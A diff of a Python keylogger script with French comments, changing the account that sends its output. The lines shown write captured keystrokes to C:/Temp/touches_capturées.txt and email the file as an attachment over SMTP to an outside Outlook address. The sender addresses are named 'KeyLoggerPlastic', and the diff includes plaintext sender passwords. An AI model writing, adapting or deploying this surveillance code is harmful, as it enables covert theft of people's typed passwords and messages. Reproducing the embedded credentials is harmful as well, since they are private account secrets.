@@ -41,8 +41,8 @@ def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_
 # Paramètres de l'email
 smtp_server = 'smtp-mail.outlook.com'  # Exemple pour Outlook
 smtp_port = 587  # Port pour TLS
-from_email = 'KeyLoggerPlastic@outlook.com'  # Votre adresse email
-password = 'fefgh5\'?3tv_sfsef'  # Votre mot de passe (Attention aux problèmes de sécurité)
+from_email = 'keyloggerplastic@gmail.com'  # Votre adresse email
+password = 'mdp?2__aazz'  # Votre mot de passe (Attention aux problèmes de sécurité)
 to_email = 'plasticeaterg12@outlook.com'  # Adresse email du destinataire
 subject = 'Voici votre fichier texte'
 body = 'Veuillez trouver en pièce jointe le fichier texte demandé.'
@@ -103,3 +103,4 @@ with open('C:/Temp/touches_capturées.txt', 'w') as file:
         file.write(f'{touche}\n')
 
 send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path)
+time.sleep(10)
